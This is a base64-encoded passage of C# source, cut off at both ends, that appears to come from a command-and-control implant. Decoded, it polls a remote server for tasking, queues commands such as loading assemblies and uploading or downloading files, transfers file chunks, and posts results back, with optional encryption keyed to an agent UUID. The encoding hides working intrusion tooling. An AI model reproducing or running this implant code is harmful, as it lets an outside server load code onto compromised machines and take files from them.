Y2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChVcGxvYWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gVXBsb2FkUmVzcG9uc2UudG90YWxfY2h1bmtzOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLkFkZChVcGxvYWRSZXNwb25zZS5jaHVua19kYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5raW5nX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtfbnVtKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZCBDaHVua1VwbG9hZCA9IG5ldyBVdGlscy5VcGxvYWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInVwbG9hZCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19zaXplID0gQ29uZmlnLkNodW5rU2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBKb2IuZmlsZV9pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEpvYi5jaHVua19udW0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBKb2IucGF0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IEh0dHAuR2V0VXBsb2FkKENodW5rVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmcgR2V0VGFza2luZyA9IG5ldyBVdGlscy5HZXRUYXNraW5nDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiZ2V0X3Rhc2tpbmciLA0KICAgICAgICAgICAgICAgICAgICB0YXNraW5nX3NpemUgPSAzDQogICAgICAgICAgICAgICAgfTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5HZXRUYXNraW5nLlRvSnNvbihHZXRUYXNraW5nKSk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gR2V0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIGlmIChmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDAsIDM2KSAhPSBDb25maWcuVVVJRCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgVXRpbHMuR2V0VGFza2luZ1Jlc3BvbnNlIEdldFRhc2tSZXNwb25zZSA9IFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDM2KSk7DQogICAgICAgICAgICAgICAgaWYgKEdldFRhc2tSZXNwb25zZS50YXNrc1swXS5jb21tYW5kID09ICIiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5UYXNrIHRhc2sgaW4gR2V0VGFza1Jlc3BvbnNlLnRhc2tzKSB7DQogICAgICAgICAgICAgICAgICAgIFV0aWxzLkpvYiBKb2IgPSBuZXcgVXRpbHMuSm9iDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYl9pZCA9IEpvYkxpc3Quam9iX2NvdW50LA0KICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHRhc2suaWQsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYl9zdGFydGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBzdWNjZXNzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGFzay5jb21tYW5kLA0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHRhc2sucGFyYW1ldGVycywNCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IDANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21tYW5kID09ICJsb2FkYXNzZW1ibHkiIHx8IEpvYi5jb21tYW5kID09ICJ1cGxvYWQiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudXBsb2FkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50b3RhbF9jaHVua3MgPSAyOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSA9IDE7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImRvd25sb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmRvd25sb2FkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9icyIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IE1vZHVsZXMuR2V0Sm9icyhKb2JMaXN0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJqb2JraWxsIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1vZHVsZXMuS2lsbEpvYihKb2JMaXN0LCBJbnQzMi5QYXJzZShKb2IucGFyYW1ldGVycykpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiSm9iIHN1Y2Nlc3NmdWxseSByZW1vdmVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJDb3VsZCBub3QgcmVtb3ZlIGpvYiI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgSm9iTGlzdC5qb2JzLkFkZChKb2IpOw0KICAgICAgICAgICAgICAgICAgICArK0pvYkxpc3Quam9iX2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBVdGlscy5VcGxvYWRSZXNwb25zZSBHZXRVcGxvYWQoVXRpbHMuVXBsb2FkIFVwbG9hZCkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLlVwbG9hZC5Ub0pzb24oVXBsb2FkKSkpOw0KI2VsaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0KFV0aWxzLlVwbG9hZC5Ub0pzb24oVXBsb2FkKSk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gR2V0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gVXRpbHMuVXBsb2FkUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIFVwbG9hZFJlc3BvbnNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IG5ldyBVdGlscy5VcGxvYWRSZXNwb25zZSB7IH07DQogICAgICAgICAgICAgICAgcmV0dXJuIFVwbG9hZFJlc3BvbnNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFBvc3RSZXNwb25zZShVdGlscy5Kb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZSBQb3N0UmVzcG9uc2UgPSBuZXcgVXRpbHMuUG9zdFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAicG9zdF9yZXNwb25zZSIsDQogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IHsgfQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIEpvYiBpbiBKb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghSm9iLnN1Y2Nlc3MpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSAiZXJyb3IiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IEpvYi5yZXNwb25zZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBKb2IudG90YWxfY2h1bmtzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY2h1bmtfbnVtID09IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gInRydWUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEpvYi5jaHVua19udW0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBKb2IuZmlsZV9pZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYmICghSm9iLnVwbG9hZCkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua19udW0gIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJmYWxzZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIERhdGEgPSBVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgaWYgKERhdGEuQ29udGFpbnMoIltdIikpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgc3RyaW5nIHJlc3VsdCA9IFBvc3QoU2VyaWFsaXplZERhdGEpOw0KI2lmIERFRkFVTFQNCiAgICAgICAgI